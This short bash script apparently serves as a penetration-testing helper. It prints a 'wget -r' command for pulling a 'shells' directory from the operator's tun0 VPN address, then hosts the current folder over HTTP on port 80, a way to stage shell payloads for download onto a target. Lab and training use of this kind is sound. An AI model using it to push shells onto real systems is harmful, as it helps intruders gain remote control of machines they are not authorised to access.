#!/bin/bash

echo "To download these files, please use the following command:"
echo ""
echo "wget -r http://$(ifconfig tun0 | grep netmask | awk '{ print $2 }')/shells"
echo ""
echo ""

python -m SimpleHTTPServer 80
